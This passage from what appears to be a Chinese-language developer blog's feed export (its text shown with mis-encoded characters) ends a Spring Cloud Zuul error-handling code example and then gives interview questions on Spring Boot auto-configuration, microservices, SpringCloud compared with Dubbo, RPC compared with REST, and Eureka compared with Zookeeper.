class="string">&quot;,message:\&quot;&quot;</span>+ exception.getMessage() +<span class="string">&quot;\&quot;&#125;&quot;</span>);</span><br><span class="line">            &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                <span class="keyword">if</span>(writer!=<span class="literal">null</span>)&#123;</span><br><span class="line">                    writer.close();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception var5) &#123;</span><br><span class="line">            ReflectionUtils.rethrowRuntimeException(var5);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<ol start="2">
<li>è‡ªå®šä¹‰å…¨å±€erroré”™è¯¯é¡µé¢</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@RestController</span></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ErrorHandlerController</span> <span class="keyword">implements</span> <span class="title class_">ErrorController</span> &#123;</span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * å‡ºå¼‚å¸¸åè¿›å…¥è¯¥æ–¹æ³•ï¼Œäº¤ç”±ä¸‹é¢çš„æ–¹æ³•å¤„ç†</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getErrorPath</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;/error&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@RequestMapping(&quot;/error&quot;)</span></span><br><span class="line">    <span class="keyword">public</span> Object <span class="title function_">error</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="type">RequestContext</span> <span class="variable">ctx</span> <span class="operator">=</span> RequestContext.getCurrentContext();</span><br><span class="line">        <span class="type">ZuulException</span> <span class="variable">exception</span> <span class="operator">=</span> (ZuulException)ctx.getThrowable();</span><br><span class="line">        <span class="keyword">return</span> exception.nStatusCode + <span class="string">&quot;--&quot;</span> + exception.getMessage();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">æ³¨æ„ï¼šå…¨å±€erroré”™è¯¯é¡µé¢ä¸è‡ªå®šä¹‰å¼‚å¸¸çš„è¿‡æ»¤å™¨æœ‰å†²çªäºŒé€‰ä¸€å³å¯</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>Java</category>
      </categories>
      <tags>
        <tag>SpringCloud</tag>
      </tags>
  </entry>
  <entry>
    <title>é¡¹ç›®ç›¸å…³é¢è¯•é¢˜</title>
    <url>/2021/12/21/leyou/%E9%A1%B9%E7%9B%AE%E7%9B%B8%E5%85%B3%E9%9D%A2%E8%AF%95%E9%A2%98%E6%B1%87%E6%80%BB/</url>
    <content><![CDATA[<h1 id="1-SpringBooté¢è¯•é¢˜"><a href="#1-SpringBooté¢è¯•é¢˜" class="headerlink" title="1.SpringBooté¢è¯•é¢˜"></a>1.SpringBooté¢è¯•é¢˜</h1><h2 id="1-1-SpringBootçš„ä½œç”¨æ˜¯ä»€ä¹ˆ"><a href="#1-1-SpringBootçš„ä½œç”¨æ˜¯ä»€ä¹ˆ" class="headerlink" title="1.1.SpringBootçš„ä½œç”¨æ˜¯ä»€ä¹ˆ?"></a>1.1.SpringBootçš„ä½œç”¨æ˜¯ä»€ä¹ˆ?</h2><p>ç­”ï¼šé‡‡ç”¨é»˜è®¤é…ç½®ï¼Œå¸®åŠ©æˆ‘ä»¬å¿«é€Ÿçš„æ„å»ºå’Œè¿è¡ŒSpringé¡¹ç›®ï¼š</p>
<ul>
<li>ç”¨æ¥ç®€åŒ–springåˆå§‹æ­å»ºå’Œå¼€å‘è¿‡ç¨‹ä½¿ç”¨ç‰¹å®šçš„æ–¹å¼è¿›è¡Œé…ç½®(propertiesæˆ–è€…ymlæ–‡ä»¶)</li>
<li>åˆ›å»ºç‹¬ç«‹çš„springå¼•ç”¨ç¨‹åºmainæ–¹æ³•è¿è¡Œ</li>
<li>åµŒå…¥Tomcatæ— éœ€éƒ¨ç½²waråŒ…ï¼Œç›´æ¥æ‰“æˆjaråŒ…nohup java -jar â€“ &amp; å¯åŠ¨å°±å¥½</li>
<li>ç®€åŒ–äº†mavençš„é…ç½®</li>
<li>è‡ªåŠ¨é…ç½®springæ·»åŠ å¯¹åº”çš„starterè‡ªåŠ¨åŒ–é…ç½®</li>
</ul>
<h2 id="1-2-SpringBootçš„è‡ªåŠ¨é…ç½®åŸç†ï¼Ÿ"><a href="#1-2-SpringBootçš„è‡ªåŠ¨é…ç½®åŸç†ï¼Ÿ" class="headerlink" title="1.2.SpringBootçš„è‡ªåŠ¨é…ç½®åŸç†ï¼Ÿ"></a>1.2.SpringBootçš„è‡ªåŠ¨é…ç½®åŸç†ï¼Ÿ</h2><p>SpringBooté¡¹ç›®çš„å¯åŠ¨ç±»éƒ½ä¼šæœ‰@SpringBootApplicationæ³¨è§£ï¼Œè€Œè¿™ä¸ªæ³¨è§£çš„äºŒçº§æ³¨è§£æ˜¯@EnableAutoConfigurationæ³¨è§£ã€‚è€Œ@EnableAutoConfigurationæ³¨è§£é€šè¿‡@Importæ³¨è§£æ¥å¯¼å…¥å„ç§åœ¨SpringBootçš„jaråŒ…ä¸­æˆ–starterä¸­å†™å¥½çš„å„ç§@Configurationå£°æ˜çš„ç±»ã€‚å…·ä½“æµç¨‹å¦‚ä¸‹ï¼š</p>
<ul>
<li>@EnableAutoConfigurationé€šè¿‡@Importæ¥å¯¼å…¥é…ç½®</li>
<li>å¯¼å…¥è¿‡ç¨‹ä¸­ï¼Œä¼šåˆ©ç”¨classLoaderè¯»å–META-INF&#x2F;spring.factoriesæ–‡ä»¶ï¼ˆkey-valueæ ¼å¼ï¼‰ä¸­çš„æ•°æ®</li>
<li>è¯»å–æ–‡ä»¶ä¸­ä»¥EnableAutoConfigurationä¸ºkeyçš„å€¼ï¼Œå€¼å°±æ˜¯Springæä¾›çš„ï¼Œæˆ–æˆ‘ä»¬å¼•å…¥çš„starterä¸­çš„åŠ äº†@Configurationçš„ç±»ï¼ŒåŒ…æ‹¬å¯¹springã€ç¬¬ä¸‰æ–¹åº“çš„å„ç§é…ç½®ã€‚ä¾‹å¦‚redisã€elasticsearchã€springmvcã€mybatisç­‰</li>
<li>å¯¹åŠ è½½åˆ°çš„@Configurationç±»åšè¿‡æ»¤ï¼Œåˆ†ä¸‰æ­¥è¿‡æ»¤ï¼š<ul>
<li>æ»¤é‡</li>
<li>å»é™¤ç”¨æˆ·é€šè¿‡excludeæ’é™¤çš„é…ç½®</li>
<li>å»é™¤ä¸æ»¡è¶³@ConditionalOnXXè¿™æ ·æ¡ä»¶çš„é…ç½®</li>
</ul>
</li>
<li>å°†å‰©ä½™çš„é…ç½®ç±»å®ä¾‹åŒ–ï¼Œå®Œæˆè‡ªåŠ¨é…ç½®åŠ è½½</li>
</ul>
<p>è¿™ä¸ªè¿‡ç¨‹ä¸­ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡è‡ªå®šä¹‰@Beançš„æ–¹å¼ï¼Œè¦†ç›–é»˜è®¤é…ç½®ä¸­å·²ç»å®Œæˆçš„Beanã€‚æˆ–è€…æˆ‘ä»¬å¯ä»¥é€šè¿‡ç¼–å†™application.propertiesæˆ–è€…application.ymlæ–‡ä»¶æ¥è¦†ç›–é»˜è®¤é…ç½®ä¸­çš„å±æ€§å€¼ã€‚</p>
<h2 id="1-3-æœ‰æ²¡æœ‰è‡ªå®šä¹‰è¿‡SpringBootçš„staterï¼Ÿ"><a href="#1-3-æœ‰æ²¡æœ‰è‡ªå®šä¹‰è¿‡SpringBootçš„staterï¼Ÿ" class="headerlink" title="1.3.æœ‰æ²¡æœ‰è‡ªå®šä¹‰è¿‡SpringBootçš„staterï¼Ÿ"></a>1.3.æœ‰æ²¡æœ‰è‡ªå®šä¹‰è¿‡SpringBootçš„staterï¼Ÿ</h2><p>æœ‰ï¼Œé¡¹ç›®ä¸­æŸäº›ä¸­é—´ä»¶çš„å®¢æˆ·ç«¯ï¼ˆå¦‚Redisã€ElasticSearchï¼‰ä¼šè¿›è¡ŒäºŒæ¬¡å°è£…ï¼Œå¹¶é€šè¿‡starteræ–¹å¼æä¾›jaråŒ…ï¼Œä¾›å¤§å®¶ä½¿ç”¨ã€‚</p>
<p>ä¸€èˆ¬å®šä¹‰starteråŒ…æ‹¬ä¸‹é¢å‡ ä¸ªå­å·¥ç¨‹ï¼š</p>
<ul>
<li>xxx-spring-boot-starterï¼špomæ ¼å¼ï¼Œç®¡ç†å½“å‰starterä¸­éœ€è¦çš„å„ç§ä¾èµ–</li>
<li>xxx-spring-boot-autoconfigureï¼šjaræ ¼å¼ï¼Œç¼–å†™@Configurationé…ç½®ç±»ï¼Œè¯»å–application.ymlæ–‡ä»¶ï¼Œå®ç°é»˜è®¤é…ç½®</li>
</ul>
<h1 id="2-SpringCloudç›¸å…³"><a href="#2-SpringCloudç›¸å…³" class="headerlink" title="2.SpringCloudç›¸å…³"></a>2.SpringCloudç›¸å…³</h1><h2 id="2-0-å¾®æœåŠ¡çš„ä¼˜ç¼ºç‚¹"><a href="#2-0-å¾®æœåŠ¡çš„ä¼˜ç¼ºç‚¹" class="headerlink" title="2.0.å¾®æœåŠ¡çš„ä¼˜ç¼ºç‚¹"></a>2.0.å¾®æœåŠ¡çš„ä¼˜ç¼ºç‚¹</h2><p>å¾®æœåŠ¡æ¶æ„æ˜¯ä¸€ç§æ¶æ„æ¨¡å¼æˆ–è€…è¯´æ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼Œå®ƒæå€¡å°†å•ä¸€åº”ç”¨ç¨‹åºåˆ’åˆ†ä¸ºä¸€ç»„å°æœåŠ¡ï¼Œæ¯ä¸ªæœåŠ¡è¿è¡Œåœ¨è‡ªå·±çš„ç‹¬ç«‹è¿›ç¨‹ä¸­ï¼ŒæœåŠ¡é—´é€šä¿¡é‡‡ç”¨è½»é‡çº§é€šä¿¡æœºåˆ¶(é€šå¸¸æ˜¯åŸºäº HTTP çš„ RESTful API)ã€‚æ¯ä¸ªæœåŠ¡éƒ½å›´ç»•ç€å…·ä½“ä¸šåŠ¡è¿›è¡Œæ„å»ºï¼Œå¹¶ä¸”èƒ½å¤Ÿè¢«ç‹¬ç«‹åœ°éƒ¨ç½²åˆ°ç”Ÿäº§ç¯å¢ƒã€ç±»ç”Ÿäº§ç¯å¢ƒç­‰ã€‚å¦å¤–ï¼Œåº”è¯¥å°½é‡é¿å…ç»Ÿä¸€çš„ã€é›†ä¸­å¼çš„æœåŠ¡ç®¡ç†æœºåˆ¶ï¼Œå¯¹å…·ä½“çš„ä¸€ä¸ªæœåŠ¡è€Œè¨€ï¼Œåº”æ ¹æ®ä¸šåŠ¡ä¸Šä¸‹æ–‡ï¼Œé€‰æ‹©åˆé€‚çš„è¯­è¨€ã€å·¥å…·å¯¹å…¶è¿›è¡Œæ„å»ºï¼Œå¯ä»¥æœ‰ä¸€ä¸ªéå¸¸è½»é‡çº§çš„é›†ä¸­å¼ç®¡ç†æ¥åè°ƒè¿™äº›æœåŠ¡ï¼Œå¯ä»¥ä½¿ç”¨ä¸åŒçš„è¯­è¨€æ¥ç¼–å†™æœåŠ¡ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨ä¸åŒçš„æ•°æ®å­˜å‚¨æŠ€æœ¯ã€‚</p>
<ul>
<li>ä¼˜ç‚¹ï¼š<ul>
<li>æ˜“äºå¼€å‘å’Œç»´æŠ¤ï¼šä¸€ä¸ªå¾®æœåŠ¡åªä¼šå…³æ³¨ä¸€ä¸ªç‰¹å®šçš„ä¸šåŠ¡åŠŸèƒ½ï¼Œæ‰€ä»¥å®ƒä¸šåŠ¡æ¸…æ™°ï¼Œä»£ç é‡è¾ƒå°‘</li>
<li>å•ä¸ªå¾®æœåŠ¡å¯åŠ¨è¾ƒå¿«ï¼šå•ä¸ªå¾®æœåŠ¡ä»£ç é‡è¾ƒå°‘ï¼Œæ‰€ä»¥å¯åŠ¨ä¼šæ¯”è¾ƒå¿«</li>
<li>ä¸šåŠ¡ä¹‹é—´æ¾è€¦åˆï¼Œæ— è®ºæ˜¯åœ¨å¼€å‘é˜¶æ®µæˆ–è€…éƒ¨ç½²é˜¶æ®µï¼Œä¸åŒçš„æœåŠ¡éƒ½æ˜¯äº’ç›¸ç‹¬ç«‹çš„</li>
<li>å±€éƒ¨ä¿®æ”¹å®¹æ˜“éƒ¨ç½²ï¼šå•ä½“åº”ç”¨åªè¦æœ‰ä¿®æ”¹ï¼Œå°±å¾—é‡æ–°éƒ¨ç½²æ•´ä¸ªåº”ç”¨ï¼Œå¾®æœåŠ¡è§£å†³äº†è¿™æ ·çš„é—®é¢˜</li>
<li>æŠ€æœ¯æ ˆä¸å—é™ï¼šåœ¨å¾®æœåŠ¡æ¶æ„ä¸­ï¼Œå¯ä»¥ç»“åˆé¡¹ç›®ä¸šåŠ¡åŠå›¢é˜Ÿçš„ç‰¹ç‚¹ï¼Œåˆç†åœ°é€‰æ‹©æŠ€æœ¯æ ˆ</li>
<li>æŒ‰éœ€ä¼¸ç¼©ï¼šå¯æ ¹æ®éœ€æ±‚ï¼Œå®ç°ç»†ç²’åº¦çš„æ‰©å±•</li>
<li>åªæœ‰ä¸šåŠ¡é€»è¾‘çš„ä»£ç ï¼Œä¸ä¼šå’Œ HTMLã€CSS æˆ–è€…å…¶ä»–å‰ç«¯é¡µé¢è€¦åˆï¼Œç›®å‰æœ‰ä¸¤ç§å¼€å‘æ¨¡å¼ï¼šå‰åç«¯åˆ†ç¦»ã€å…¨æ ˆå¼€å‘</li>
</ul>
</li>
<li>ç¼ºç‚¹ï¼š<ul>
<li>è¿ç»´è¦æ±‚é«˜ï¼šæ›´å¤šçš„æœåŠ¡æ„å‘³ç€æ›´å¤šçš„è¿ç»´æŠ•å…¥</li>
<li>æŠ€æœ¯å¼€å‘éš¾åº¦é«˜ï¼šæ¶‰åŠåˆ°ç½‘ç»œé€šä¿¡å»¶è¿Ÿã€æœåŠ¡å®¹é”™ã€æ•°æ®ä¸€è‡´æ€§ã€ç³»ç»Ÿé›†æˆæµ‹è¯•ã€ç³»ç»Ÿéƒ¨ç½²ä¾èµ–ã€æ€§èƒ½ç›‘æ§ç­‰</li>
<li>åˆ†å¸ƒå¼ç³»ç»Ÿå›ºæœ‰çš„å¤æ‚æ€§ï¼šä½¿ç”¨å¾®æœåŠ¡æ¶æ„æ˜¯åˆ†å¸ƒå¼ç³»ç»Ÿï¼Œå¯¹äºä¸€ä¸ªåˆ†å¸ƒå¼ç³»ç»Ÿï¼Œç³»ç»Ÿå®¹é”™ï¼Œç½‘ç»œå»¶è¿Ÿï¼Œåˆ†å¸ƒå¼äº‹åŠ¡ç­‰éƒ½ä¼šå¸¦æ¥å·¨å¤§çš„æŒ‘æˆ˜</li>
<li>æ¥å£è°ƒæ•´æˆæœ¬é«˜ï¼šå¾®æœåŠ¡ä¹‹é—´é€šè¿‡æ¥å£è¿›è¡Œé€šä¿¡ã€‚å¦‚æœä¿®æ”¹æŸä¸€ä¸ªå¾®æœåŠ¡çš„ APIï¼Œå¯èƒ½æ‰€æœ‰ä½¿ç”¨äº†è¯¥æ¥å£çš„å¾®æœåŠ¡éƒ½éœ€è¦åšè°ƒæ•´</li>
<li>é‡å¤åŠ³åŠ¨ï¼šå¾ˆå¤šæœåŠ¡å¯èƒ½éƒ½ä¼šä½¿ç”¨åˆ°ç›¸åŒçš„åŠŸèƒ½ï¼Œè€Œè¿™ä¸ªåŠŸèƒ½å¹¶æ²¡æœ‰è¾¾åˆ°åˆ†è§£ä¸ºä¸€ä¸ªå¾®æœåŠ¡çš„ç¨‹åº¦ï¼Œè¿™ä¸ªæ—¶å€™ï¼Œå¯èƒ½å„ä¸ªæœåŠ¡éƒ½ä¼šå¼€å‘è¿™ä¸€åŠŸèƒ½ï¼Œä»è€Œå¯¼è‡´ä»£ç é‡å¤</li>
</ul>
</li>
</ul>
<h2 id="2-1-SpringCloudå’ŒDubboçš„åŒºåˆ«"><a href="#2-1-SpringCloudå’ŒDubboçš„åŒºåˆ«" class="headerlink" title="2.1.SpringCloudå’ŒDubboçš„åŒºåˆ«"></a>2.1.SpringCloudå’ŒDubboçš„åŒºåˆ«</h2><p>SpringCloudï¼šSpringå…¬å¸å¼€æºçš„å¾®æœåŠ¡æ¡†æ¶ï¼ŒSpirngCloud å®šä½ä¸ºå¾®æœåŠ¡æ¶æ„ä¸‹çš„ä¸€ç«™å¼è§£å†³æ–¹æ¡ˆï¼ˆå¾®æœåŠ¡ç”Ÿæ€ï¼‰</p>
<p>Dubboï¼šé˜¿é‡Œå·´å·´å¼€æºçš„RPCæ¡†æ¶ï¼ŒDubbo æ˜¯ SOA æ—¶ä»£çš„äº§ç‰©ï¼Œå®ƒçš„å…³æ³¨ç‚¹ä¸»è¦åœ¨äºæœåŠ¡çš„è°ƒç”¨ï¼Œæµé‡åˆ†å‘ã€æµé‡ç›‘æ§å’Œç†”æ–­</p>
<table>
<thead>
<tr>
<th>åŠŸèƒ½</th>
<th>Dubbo</th>
<th>SpringCloud</th>
</tr>
</thead>
<tbody><tr>
<td>æœåŠ¡æ³¨å†Œä¸­å¿ƒ</td>
<td>Zookeeperã€Redis</td>
<td>Spring Cloud Netfix Eureka</td>
</tr>
<tr>
<td>æœåŠ¡è°ƒç”¨æ–¹å¼</td>
<td>RPC</td>
<td>REST API</td>
</tr>
<tr>
<td>æœåŠ¡ç›‘æ§</td>
<td>Dubbo-Monitor</td>
<td>Spring Boot Admin</td>
</tr>
<tr>
<td>ç†”æ–­å™¨</td>
<td>ä¸å®Œå–„</td>
<td>Spring Cloud Netflix Hystrix</td>
</tr>
<tr>
<td>æœåŠ¡ç½‘å…³</td>
<td>æ— </td>
<td>Spring Cloud Netflix Zuul</td>
</tr>
<tr>
<td>åˆ†å¸ƒå¼é…ç½®</td>
<td>æ— </td>
<td>Spring Cloud Config</td>
</tr>
<tr>
<td>æœåŠ¡è·Ÿè¸ª</td>
<td>æ— </td>
<td>Spring Cloud Sleuth</td>
</tr>
<tr>
<td>æ•°æ®æµ</td>
<td>æ— </td>
<td>Spring Cloud Stream</td>
</tr>
<tr>
<td>æ‰¹é‡ä»»åŠ¡</td>
<td>æ— </td>
<td>Spring Cloud Task</td>
</tr>
<tr>
<td>ä¿¡æ¯æ€»çº¿</td>
<td>æ— </td>
<td>Spring Cloud Bus</td>
</tr>
</tbody></table>
<p>Spring Cloud çš„åŠŸèƒ½å¾ˆæ˜æ˜¾æ¯” Dubbo æ›´åŠ å¼ºå¤§ï¼Œæ¶µç›–é¢æ›´å¹¿ï¼Œè€Œä¸”ä½œä¸º Spring çš„æ——èˆ°é¡¹ç›®ï¼Œå®ƒä¹Ÿèƒ½å¤Ÿä¸ Spring Frameworkã€Spring Bootã€Spring Dataã€Spring Batch ç­‰å…¶ä»– Spring é¡¹ç›®å®Œç¾èåˆï¼Œè¿™äº›å¯¹äºå¾®æœåŠ¡è€Œè¨€æ˜¯è‡³å…³é‡è¦çš„ã€‚</p>
<p>ä½¿ç”¨ Dubbo æ„å»ºçš„å¾®æœåŠ¡æ¶æ„å°±åƒç»„è£…ç”µè„‘ï¼Œå„ç¯èŠ‚é€‰æ‹©è‡ªç”±åº¦å¾ˆé«˜ï¼Œä½†æ˜¯æœ€ç»ˆç»“æœå¾ˆæœ‰å¯èƒ½å› ä¸ºä¸€æ¡å†…å­˜è´¨é‡ä¸è¡Œå°±ç‚¹ä¸äº®äº†ï¼Œæ€»æ˜¯è®©äººä¸æ€ä¹ˆæ”¾å¿ƒï¼Œä½†æ˜¯å¦‚æœä½¿ç”¨è€…æ˜¯ä¸€åé«˜æ‰‹ï¼Œé‚£è¿™äº›éƒ½ä¸æ˜¯é—®é¢˜ã€‚</p>
<p>è€Œ Spring Cloud å°±åƒå“ç‰Œæœºï¼Œåœ¨ Spring Source çš„æ•´åˆä¸‹ï¼Œåšäº†å¤§é‡çš„å…¼å®¹æ€§æµ‹è¯•ï¼Œä¿è¯äº†æœºå™¨æ‹¥æœ‰æ›´é«˜çš„ç¨³å®šæ€§ï¼Œä½†æ˜¯å¦‚æœè¦åœ¨ä½¿ç”¨éåŸè£…ç»„ä»¶å¤–çš„ä¸œè¥¿ï¼Œå°±éœ€è¦å¯¹å…¶åŸºç¡€åŸç†æœ‰è¶³å¤Ÿçš„äº†è§£ã€‚</p>
<h2 id="2-2-RPCä¸Restçš„åŒºåˆ«ï¼ˆdubboåè®®å’ŒFeignè¿œç¨‹è°ƒç”¨çš„å·®å¼‚ï¼‰"><a href="#2-2-RPCä¸Restçš„åŒºåˆ«ï¼ˆdubboåè®®å’ŒFeignè¿œç¨‹è°ƒç”¨çš„å·®å¼‚ï¼‰" class="headerlink" title="2.2.RPCä¸Restçš„åŒºåˆ«ï¼ˆdubboåè®®å’ŒFeignè¿œç¨‹è°ƒç”¨çš„å·®å¼‚ï¼‰"></a>2.2.RPCä¸Restçš„åŒºåˆ«ï¼ˆdubboåè®®å’ŒFeignè¿œç¨‹è°ƒç”¨çš„å·®å¼‚ï¼‰</h2><p>Dubboåè®®é»˜è®¤é‡‡ç”¨çš„æ—¶RPCæ¡†æ¶å®ç°è¿œç¨‹è°ƒç”¨ï¼Œè€ŒSpringCloudä¸­ä½¿ç”¨çš„æ—¶åŸºäºResté£æ ¼çš„è°ƒç”¨æ–¹å¼ã€‚åŒ…æ‹¬ä¸‹é¢åŒºåˆ«ï¼š</p>
<h3 id="1ï¼‰Resté£æ ¼"><a href="#1ï¼‰Resté£æ ¼" class="headerlink" title="1ï¼‰Resté£æ ¼"></a>1ï¼‰Resté£æ ¼</h3><p>RESTæ˜¯ä¸€ç§æ¶æ„é£æ ¼ï¼ŒæŒ‡çš„æ˜¯ä¸€ç»„æ¶æ„çº¦æŸæ¡ä»¶å’ŒåŸåˆ™ã€‚æ»¡è¶³è¿™äº›çº¦æŸæ¡ä»¶å’ŒåŸåˆ™çš„åº”ç”¨ç¨‹åºæˆ–è®¾è®¡å°±æ˜¯ RESTfulã€‚</p>
<p>Restçš„é£æ ¼å¯ä»¥å®Œå…¨é€šè¿‡HTTPåè®®å®ç°ï¼Œä½¿ç”¨ HTTP åè®®å¤„ç†æ•°æ®é€šä¿¡ã€‚RESTæ¶æ„å¯¹èµ„æºçš„æ“ä½œåŒ…æ‹¬è·å–ã€åˆ›å»ºã€ä¿®æ”¹å’Œåˆ é™¤èµ„æºçš„æ“ä½œæ­£å¥½å¯¹åº”HTTPåè®®æä¾›çš„GETã€POSTã€PUTå’ŒDELETEæ–¹æ³•ã€‚</p>
<p>å› æ­¤è¯·æ±‚å’Œæƒ³è¦è¿‡ç¨‹åªè¦éµå¾ªhttpåè®®å³å¯ï¼Œæ›´åŠ çµæ´»</p>
<p>SpringCloudä¸­çš„Feignå°±æ˜¯Resté£æ ¼çš„è°ƒç”¨æ–¹å¼ã€‚</p>
<h3 id="2ï¼‰RPC"><a href="#2ï¼‰RPC" class="headerlink" title="2ï¼‰RPC"></a>2ï¼‰RPC</h3><p>Remote Procedure Callï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨ï¼Œå°±æ˜¯åƒè°ƒç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·è°ƒç”¨è¿œç¨‹æ–¹æ³•ã€‚RPCæ¶æ„å›¾ï¼š</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202112212142539.png" alt="img"></p>
<p>RPCä¸€èˆ¬è¦ç¡®å®šä¸‹é¢å‡ ä»¶äº‹æƒ…ï¼š</p>
<ul>
<li>æ•°æ®ä¼ è¾“æ–¹å¼ï¼šå¤šæ•°RPCæ¡†æ¶é€‰æ‹©TCPä½œä¸ºä¼ è¾“åè®®ï¼Œæ€§èƒ½æ¯”è¾ƒå¥½ï¼Œä¹Ÿæœ‰éƒ¨åˆ†æ¡†æ¶é€‰æ‹©httpåè®®ã€‚</li>
<li>æ•°æ®ä¼ è¾“å†…å®¹ï¼šè¯·æ±‚æ–¹éœ€è¦å‘ŠçŸ¥éœ€è¦è°ƒç”¨çš„å‡½æ•°çš„åç§°ã€å‚æ•°ã€ç­‰ä¿¡æ¯ã€‚</li>
<li>åºåˆ—åŒ–æ–¹å¼ï¼šå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯äº¤äº’æ—¶å°†å‚æ•°æˆ–ç»“æœè½¬åŒ–ä¸ºå­—èŠ‚æµåœ¨ç½‘ç»œä¸­ä¼ è¾“ï¼Œé‚£ä¹ˆæ•°æ®è½¬åŒ–ä¸ºå­—èŠ‚æµçš„æˆ–è€…å°†å­—èŠ‚æµè½¬æ¢æˆèƒ½è¯»å–çš„å›ºå®šæ ¼å¼æ—¶å°±éœ€è¦è¿›è¡Œåºåˆ—åŒ–å’Œååºåˆ—åŒ–</li>
</ul>
<p>å› ä¸ºæœ‰åºåˆ—åŒ–å’Œååºåˆ—åŒ–çš„éœ€æ±‚ï¼Œå› æ­¤å¯¹æ•°æ®ä¼ è¾“æ ¼å¼æœ‰ä¸¥æ ¼è¦æ±‚ï¼Œä¸å¦‚Httpçµæ´»</p>
<p>Dubboåè®®å°±æ˜¯RPCçš„å…¸å‹ä»£è¡¨ã€‚</p>
<p>æˆ‘ä»¬çœ‹çœ‹Dubboåè®®å’ŒRestçš„è°ƒç”¨åŒºåˆ«ï¼š</p>
<table>
<thead>
<tr>
<th></th>
<th>Dubbo</th>
<th>Restï¼ˆHttpè°ƒç”¨ï¼‰</th>
</tr>
</thead>
<tbody><tr>
<td>ä¼ è¾“åè®®</td>
<td>TCP</td>
<td>TCP</td>
</tr>
<tr>
<td>å¼€å‘è¯­è¨€</td>
<td>java</td>
<td>ä¸é™</td>
</tr>
<tr>
<td>æ€§èƒ½</td>
<td>å¥½</td>
<td>ä¸€èˆ¬</td>
</tr>
<tr>
<td>çµæ´»æ€§</td>
<td>ä¸€èˆ¬</td>
<td>å¥½</td>
</tr>
</tbody></table>
<h2 id="2-3-Eurekaå’ŒZookeeperæ³¨å†Œä¸­å¿ƒçš„åŒºåˆ«"><a href="#2-3-Eurekaå’ŒZookeeperæ³¨å†Œä¸­å¿ƒçš„åŒºåˆ«" class="headerlink" title="2.3.Eurekaå’ŒZookeeperæ³¨å†Œä¸­å¿ƒçš„åŒºåˆ«"></a>2.3.Eurekaå’ŒZookeeperæ³¨å†Œä¸­å¿ƒçš„åŒºåˆ«</h2><p>ç­”ï¼š</p>
<p>å…ˆçœ‹ä¸‹CAPåŸåˆ™ï¼šC-æ•°æ®ä¸€è‡´æ€§ï¼›A-æœåŠ¡å¯ç”¨æ€§ï¼›P-æœåŠ¡å¯¹ç½‘ç»œåˆ†åŒºæ•…éšœçš„å®¹é”™æ€§ï¼Œè¿™ä¸‰ä¸ªç‰¹æ€§åœ¨ä»»ä½•åˆ†å¸ƒå¼ç³»ç»Ÿä¸­ä¸èƒ½åŒæ—¶æ»¡è¶³ï¼Œæœ€å¤šåŒæ—¶æ»¡è¶³ä¸¤ä¸ª</p>
<ul>
<li>Eurekaæ»¡è¶³APï¼ŒZookeeperæ»¡è¶³CP<ul>
<li>Zookeeperæ»¡è¶³ä¸€è‡´æ€§ã€å®¹é”™æ€§ã€‚æ•°æ®è¦åœ¨å„ä¸ªæœåŠ¡é—´åŒæ­¥å®Œæˆåæ‰è¿”å›ç”¨æˆ·ç»“æœï¼Œè€Œä¸”å¦‚æœæœåŠ¡å‡ºç°ç½‘ç»œæ³¢åŠ¨ï¼Œä¼šç«‹å³ä»æœåŠ¡åˆ—è¡¨ä¸­å‰”é™¤ï¼ŒæœåŠ¡ä¸å¯ä½¿ç”¨</li>
<li>Eurekaæ»¡è¶³APï¼Œå¯ç”¨æ€§ï¼Œå®¹é”™æ€§ã€‚å½“å› ç½‘ç»œæ•…éšœæ—¶ï¼ŒEurekaçš„è‡ªæˆ‘ä¿æŠ¤æœºåˆ¶ä¸ä¼šç«‹å³å‰”é™¤æœåŠ¡ï¼Œè™½ç„¶ç”¨æˆ·è·å–åˆ°çš„æœåŠ¡ä¸ä¸€å®šæ—¶å¯ç”¨çš„ï¼Œä½†æ˜¯è‡³å°‘èƒ½å¤Ÿè·å–åˆ°æœåŠ¡åˆ—è¡¨ã€‚ç”¨æˆ·è®¿é—®æœåŠ¡åˆ—è¡¨æ—¶è¿˜å¯ä»¥åˆ©ç”¨é‡è¯•æœºåˆ¶ï¼Œæ‰¾åˆ°æ­£ç¡®çš„æœåŠ¡ã€‚æ›´ç¬¦åˆåˆ†å¸ƒå¼æœåŠ¡çš„é«˜å¯ç”¨éœ€æ±‚</li>
</ul>
</li>
<li>Eurekaé›†ç¾¤å„èŠ‚ç‚¹å¹³ç­‰ï¼ŒZookeeperä¸­æœ‰ä¸»ä»ä¹‹åˆ†<ul>
<li>å¦‚æœZookeeperé›†ç¾¤ä¸­éƒ¨åˆ†å®•æœºï¼Œå¯èƒ½ä¼šå¯¼è‡´æ•´ä¸ªé›†ç¾¤å› ä¸ºé€‰ä¸»è€Œé˜»å¡ï¼ŒæœåŠ¡ä¸å¯ç”¨</li>
<li>eurekaé›†ç¾¤å®•æœºéƒ¨åˆ†ï¼Œä¸ä¼šå¯¹å…¶å®ƒæœºå™¨äº§ç”Ÿå½±å“</li>
</ul>
</li>
